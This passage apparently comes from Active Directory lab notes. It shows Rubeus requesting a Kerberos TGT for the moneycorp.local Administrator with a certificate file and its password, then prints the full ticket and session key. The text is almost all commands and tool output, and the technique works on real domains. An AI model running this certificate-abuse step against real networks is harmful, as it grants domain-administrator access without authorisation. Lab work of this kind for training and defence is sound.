C:\AD\Tools>dir C:\AD\Tools\EA.pfx
 Volume in drive C has no label.
 Volume Serial Number is 1A5A-FDE2

 Directory of C:\AD\Tools

05/03/2023  12:41 AM             3,331 EA.pfx
               1 File(s)          3,331 bytes
               0 Dir(s)   9,592,348,672 bytes free
```

Abuse of certificate:

```
:\AD\Tools>C:\AD\Tools\Rubeus.exe asktgt /user:moneycorp.local\Administrator /certificate:C:\AD\Tools\certificate_EA.pfx /password:SecretPass@123 /dc:mcorp-dc.moneycorp.local

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'moneycorp.local\Administrator'
[*] Using domain controller: 172.16.1.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/moneycorp.local
  ServiceRealm             :  MONEYCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  MONEYCORP.LOCAL
  StartTime                :  5/3/2023 1:01:21 AM
  EndTime                  :  5/3/2023 11:01:21 AM
  RenewTill                :  5/10/2023 1:01:21 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  RE1NntnsgtEQGFLzNAvZDw==
  ASREP (key)              :  2FB68A2A9ECDE026015BFD2BA01AD5EC
```
